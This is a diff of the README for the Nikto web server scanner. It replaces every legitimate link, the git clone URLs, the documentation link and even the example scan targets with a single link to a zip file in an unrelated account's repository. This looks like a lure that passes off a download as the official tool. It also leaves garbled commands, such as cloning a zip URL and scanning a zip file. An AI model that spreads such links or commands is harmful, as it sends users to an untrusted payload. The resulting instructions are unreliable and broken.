@@ -1,23 +1,23 @@
 
 nikto
 =====
-[![alt text](https://cirt.net/wp-content/uploads/2025/12/patreon.png "Become a patron of Nikto!")](https://www.patreon.com/sullo)
+[![alt text](https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip "Become a patron of Nikto!")](https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip)
 
 
-Nikto web server scanner  - https://cirt.net/Nikto2 
+Nikto web server scanner  - https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip 
 
-Full documentation - https://github.com/sullo/nikto/wiki
+Full documentation - https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 
 Run normally:
 
 ~~~
-git clone https://github.com/sullo/nikto
+git clone https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 # Main script is in program/
 cd nikto/program
 # Run using the shebang interpreter
-./nikto.pl -h http://www.example.com
+./nikto.pl -h https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 # Run using perl (if you hate chmod)
-perl nikto.pl -h http://www.example.com
+perl nikto.pl -h https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 ~~~
 
 Run as a Docker container from ghcr.io:
@@ -27,15 +27,15 @@ Run as a Docker container from ghcr.io:
 Run as a Docker container:
 
 ~~~bash
-git clone https://github.com/sullo/nikto.git
+git clone https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 cd nikto
 docker build -t sullo/nikto .
 # Call it without arguments to display the full help
 docker run --rm sullo/nikto
 # Basic usage
-docker run --rm sullo/nikto -h http://www.example.com
+docker run --rm sullo/nikto -h https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip
 # To save the report in a specific format, mount /tmp as a volume:
-docker run --rm -v $(pwd):/tmp sullo/nikto -h http://www.example.com -o /tmp/out.json
+docker run --rm -v $(pwd):/tmp sullo/nikto -h https://raw.githubusercontent.com/Moza630/nikto/master/program/Software_v3.9.zip -o /tmp/out.json
 ~~~
 
 Basic usage:
